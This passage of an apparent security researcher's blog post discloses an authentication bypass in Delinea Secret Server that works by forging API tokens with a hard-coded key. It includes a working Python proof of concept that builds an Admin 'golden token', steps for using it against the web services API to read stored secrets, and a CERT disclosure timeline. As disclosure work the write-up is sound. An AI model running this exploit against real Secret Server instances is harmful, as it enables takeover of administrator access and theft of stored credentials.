1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 640w, https://miro.medium.com/v2/resize:fit:720/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 720w, https://miro.medium.com/v2/resize:fit:750/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 750w, https://miro.medium.com/v2/resize:fit:786/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 786w, https://miro.medium.com/v2/resize:fit:828/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln mp c" width="700" height="280" loading="lazy" role="presentation"/></picture></div></div></figure><p id="63b1" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">Through dynamic analysis, I observed every user profile is represented with an Integer value in consecutive order. Integer <strong class="ms gv">2</strong> is always the <strong class="ms gv">Admin</strong> user (<em class="ot">note:</em> This user profile gets create as part of the installation of the application).</p><p id="1ff8" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">The attack path is starting to take shape. If we know the hard-coded key to deserializing the API token and we know the Integer value associated with the Admin profile, we should be able to craft a serialized API token with Admin role, and net access to any Delinea Secret Server’s protected resources through the web services API.</p><p id="875f" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">The story is not complete without encountering and getting pass roadblock. I encountered a hurdle in this section of the <strong class="ms gv">IsValidToken</strong> function:</p><pre class="nt nu nv nw nx oc od oe bp of bb bk"><span id="ddd5" class="og oh gu od b bg oi oj l ok ol">... snipped ..<br/>Claim claim;<br/>Guid oauthExpirationId = new Guid(claim.Value);<br/>oauthExpiration = this._oAuthExpirationService.Load(oauthExpirationId);<br/>num = (short)455344133;<br/>num2 = (int)((IntPtr)num);<br/>... snipped ...</span></pre><p id="8c35" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">The <strong class="ms gv">oauthExpirationId</strong> property is accessible through <strong class="ms gv">Microsoft.Owin.Security.AuthenticationTicket</strong> object, and this property contains a UUIDv4 value that gets generated per user authentication. For example, when user Admin authenticates through the web UI, an <strong class="ms gv">AuthenticationTicket</strong> object is created along with a timestamp that is stored in the application cache. When a user access a web service with an API token, the deserialized <strong class="ms gv">AuthenticationTicket</strong> object will use the UUIDv4 value stored in <strong class="ms gv">oauthExpirationId</strong> to reference the timestamp in application cache to determine when the associated <strong class="ms gv">AuthenticationTicket </strong>object was created. This is to ensure an API token is tied to an authenticated user.</p><figure class="nt nu nv nw nx mo mg mh paragraph-image"><div role="button" tabindex="0" class="ny nz fj oa bh ob"><div class="mg mh ou"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*RctpIUcb5xkGvnPBNR9uhg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*RctpIUcb5xkGvnPBNR9uhg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*RctpIUcb5xkGvnPBNR9uhg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*RctpIUcb5xkGvnPBNR9uhg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*RctpIUcb5xkGvnPBNR9uhg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*RctpIUcb5xkGvnPBNR9uhg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RctpIUcb5xkGvnPBNR9uhg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*RctpIUcb5xkGvnPBNR9uhg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*RctpIUcb5xkGvnPBNR9uhg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*RctpIUcb5xkGvnPBNR9uhg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*RctpIUcb5xkGvnPBNR9uhg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*RctpIUcb5xkGvnPBNR9uhg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*RctpIUcb5xkGvnPBNR9uhg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*RctpIUcb5xkGvnPBNR9uhg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln mp c" width="700" height="280" loading="lazy" role="presentation"/></picture></div></div></figure><p id="86c5" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">This puts a stop towards the attack path because there is no way to determine a valid UUIDv4 value generated by the application. The goal of crafting a AuthN/AuthZ bypass vanished.</p><p id="7dcb" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">While I encountered setback, what is the next best thing I can do? It turns out the UUIDv4 value does not have any association with a user profile. So user Alice can use user Bob’s <strong class="ms gv">oauthExpirationId</strong> UUIDv4 value as long as the referenced timestamp have not expired. I was able to figured this out by editing the values manually with the DnSpy debugger. This gives an avenue for a Local Privilege Escalation path:</p><ol class=""><li id="6828" class="mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn om nq nr bk">A low privileged user (Bob) authenticates to the application and collect its API token.</li></ol><p id="3f1d" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">2. Bob examines its API token and extract the <strong class="ms gv">oauthExpirationId</strong> value.</p><p id="3347" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">3. Bob crafts an Admin privileged <strong class="ms gv">AuthenticationTicket</strong> with the <strong class="ms gv">nameidentifer</strong> property set to <strong class="ms gv">2</strong>, and the <strong class="ms gv">oauthExpirationId</strong> it had from its original API token, and finishes off with encrypting and serializing the <strong class="ms gv">AuthenticationTicket </strong>into an API token with the hard-coded key.</p><p id="c8ae" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">This is a pretty good attack path, but I wasn’t satisfy with the result. My instinct tells me there should be a way with getting a full AuthN/AuthZ bypass, and I should not settle for a LPE.</p><p id="fc81" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">The final discovery that led to a full AuthN/AuthZ bypass for any Delinea Secret Server is very simple and was something I overlooked. It turns out if I remove the <strong class="ms gv">oauthExpirationId</strong> attribute from the <strong class="ms gv">AuthenticationTicket </strong>object, the timestamp check will not get invoked!</p><p id="0965" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">Coincidentally after my discovery, Delinea released version <strong class="ms gv">11.6.000025</strong> of their Secret Server, which still have the security issues described in this blog post.</p><p id="bb70" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk"><strong class="ms gv">3/28/2024 Update</strong>: Delinea Secret Server latest version <strong class="ms gv">11.7.000000 </strong>is vulnerable as well.</p><p id="40fd" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk"><strong class="ms gv">PoC || GTFO</strong></p><p id="1e89" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">1. Download Delinea Secret Server and install it (<a class="af no" href="https://support.delinea.com/s/download-onprem" rel="noopener ugc nofollow" target="_blank"><strong class="ms gv">https://support.delinea.com/s/download-onprem</strong></a>) — to use their DLL files.</p><p id="3d4e" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">2. Install python, for my instance, python is installed to <strong class="ms gv">C:\Users\Administrator\AppData\Local\Programs\Python\Python312\python.exe</strong></p><p id="9020" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">3. Install <strong class="ms gv">pythonnet</strong>, which allows python to talk to .NET: <strong class="ms gv">C:\Users\Administrator\AppData\Local\Programs\Python\Python312\python.exe -m pip install pythonnet</strong></p><p id="1cbf" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">4. Open <strong class="ms gv">cmd.exe</strong> and go to <strong class="ms gv">C:\inetpub\wwwroot\SecretServer\bin</strong></p><p id="1a2f" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">5. Run <strong class="ms gv">C:\Users\Administrator\AppData\Local\Programs\Python\Python312\python.exe</strong> under <strong class="ms gv">C:\inetpub\wwwroot\SecretServer\bin</strong></p><p id="4644" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">6. Copy &amp; Paste the following python code into Python interpreter to generate the Golden token:</p><pre class="nt nu nv nw nx oc od oe bp of bb bk"><span id="ad0b" class="og oh gu od b bg oi oj l ok ol">import clr<br/>clr.AddReference(&quot;Thycotic.Identity&quot;)<br/>clr.AddReference(&quot;Microsoft.Owin.Security&quot;)<br/>import sys<br/>from System import *<br/>from System.Security.Claims import *<br/>from Microsoft.Owin.Security import *<br/>from Thycotic.Identity.Providers import *<br/>from Thycotic.Identity.Formatters import *<br/>from Thycotic.Identity.Protectors import *<br/><br/>def buildToken(id):<br/>   claimsIdentity = ClaimsIdentity(&quot;ExternalBearer&quot;, &quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name&quot;, &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;)<br/>   claimsIdentity.AddClaim(Claim(&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier&quot;, str(id), &quot;http://www.w3.org/2001/XMLSchema#integer&quot;, &quot;Thycotic.Identity&quot;, &quot;Thycotic.Identity&quot;))<br/>   properties = AuthenticationProperties()<br/>   properties.IssuedUtc = DateTimeOffset.UtcNow.Add(TimeSpan(0,0,0,0))<br/>   properties.IsPersistent = False<br/>   authenticationTicket = AuthenticationTicket(claimsIdentity, properties)<br/>   keyProvider = KeyProvider()<br/>   dataProtector = ThycoticDataProtector(keyProvider)<br/>   secureTokenFormatter = SecureTokenFormatter(dataProtector)<br/>   token = secureTokenFormatter.Protect(authenticationTicket)<br/>   return token<br/><br/>buildToken(2)</span></pre><p id="14d8" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">7. Browse to <strong class="ms gv">http://&lt;target&gt;/SecretServer/webservices/SSWebService.asmx?op=WhoAmI</strong> and paste the token into the POST field and observe the <strong class="ms gv">Admin</strong> profile is returned. <strong class="ms gv"><em class="ot">note:</em></strong> &lt;target&gt; can be localhost</p><p id="22b9" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">8.</p><p id="d3ff" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">For more serious impact:</p><p id="c573" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">Make a SOAP request to <strong class="ms gv">http://&lt;target&gt;/SecretServer/webservices/SSWebService.asmx?op=SearchSecrets</strong> — to obtain stored secrets</p><p id="db2f" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk"><strong class="ms gv">Disclosure Timeline</strong></p><p id="ed49" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">2/12/2024 — I sent an email to Delinea, and their response stated that I am ineligible to open a case since I am not affiliated with a paying customer/organization.</p><p id="6498" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">02/12/2024 — I reached out to CERT to coordinate responsible disclosure with Delinea. CERT opened case VU#979120</p><p id="ae58" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">02/16/2024 — Status update from CERT noted Delinea did not respond</p><p id="1b92" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">02/23/2024 — Status update from CERT noted Delinea did not respond</p><p id="3357" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">03/05/2024 — Status update from CERT noted Delinea did not respond</p><p id="2153" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">03/18/2024 — Status update from CERT noted Delinea did not respond. CERT extended disclosure deadline to 04/03/2024</p><p id="4007" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">03/28/2024 — No update, no response</p><p id="4708" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">04/03/2024 — No update, no response. CERT extended disclosure deadline to 04/10/2024</p><p id="f217" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">04/10/2024 — Public disclosure of the vulnerability</p><p id="04de" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">04/12/2024 — Delinea acknowledged the finding and is addressing it — <a class="af no" href="https://trust.delinea.com/?tcuUid=17aaf4ef-ada9-46d5-bf97-abd3b07daae3" rel="noopener ugc nofollow" target="_blank">https://trust.delinea.com/?tcuUid=17aaf4ef-ada9-46d5-bf97-abd3b07daae3</a></p></div></div></div></div></section></div></div></article></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ov ow ab iv"><div class="ox ab"><a class="oy ay am ao" href="https://medium.com/tag/web-security?source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><div class="oz fj cx pa ge pb pc bf b bg z bk pd">Web Security</div></a></div><div class="ox ab"><a class="oy ay am ao" href="https://medium.com/tag/web-exploitation?source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><div class="oz fj cx pa ge pb pc bf b bg z bk pd">Web Exploitation</div></a></div></div></div></div><div class="l"></div><footer class="pe pf pg ph pi ab q pj pk c"><div class="l ae"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab cp pl"><div class="ab q ke"><div class="pm l"><span class="l pn po pp e d"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fadc26c800ad3&amp;operation=register&amp;redirect=https%3A%2F%2Fstraightblast.medium.com%2Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3&amp;user=Johnny+Yu+%28%40straight_blast%29&amp;userId=4bd9d210b6d1&amp;source=---footer_actions--adc26c800ad3---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span><span class="l h g f pq pr"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fadc26c800ad3&amp;operation=register&amp;redirect=https%3A%2F%2Fstraightblast.medium.com%2Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3&amp;user=Johnny+Yu+%28%40straight_blast%29&amp;userId=4bd9d210b6d1&amp;source=---footer_actions--adc26c800ad3---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao kk la lb ab q fk lc ld" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="le"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ab q"><div class="ps l is"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fadc26c800ad3&amp;operation=register&amp;redirect=https%3A%2F%2Fstraightblast.medium.com%2Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3&amp;source=---footer_actions--adc26c800ad3---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lg" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="ps l is"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al lo an ao ap ex lp lq ld lr"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="pt l"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab pu pv pw iu it"><div class="px py pz qa qb qc qd qe qf qg ab cp"><div class="h k"><a tabindex="0" rel="noopener follow" href="/?source=post_page---post_author_info--adc26c800ad3--------------------------------"><div class="l fj"><img alt="Johnny Yu (@straight_blast)" class="l fd by ic ib cx" src="https://miro.medium.com/v2/resize:fill:96:96/2*pGIaZHTZBFR36xUvnclH5A.jpeg" width="48" height="48" loading="lazy"/><div class="fr by l ic ib fs n ay qh"></div></div></a></div><div class="j i d"><a tabindex="0" rel="noopener follow" href="/?source=post_page---post_author_info--adc26c800ad3--------------------------------"><div class="l fj"><img alt="Johnny Yu (@straight_blast)" class="l fd by qi qj cx" src="https://miro.medium.com/v2/resize:fill:128:128/2*pGIaZHTZBFR36xUvnclH5A.jpeg" width="64" height="64" loading="lazy"/><div class="fr by l qi qj fs n ay qh"></div></div></a></div><div class="j i d qk is"><div class="ab"><span><button class="bf b bg z ql oz qm qn qo qp qq ev ew qr qs qt fa fb fc fd bm fe ff">Follow</button></span></div></div></div><div class="ab co qu"><div class="qv qw qx qy qz l"><a class="af ag ah aj ak al am an ao ap aq ar as at ab q" rel="noopener follow" href="/?source=post_page---post_author_info--adc26c800ad3--------------------------------"><h2 class="pw-author-name bf rb rc rd re rf rg rh nb ri rj nf rk rl nj rm rn bk"><span class="gn ra">Written by <!-- -->Johnny Yu (@straight_blast)</span></h2></a><div class="ox ab ia"><div class="l is"><span class="pw-follower-count bf b bg z 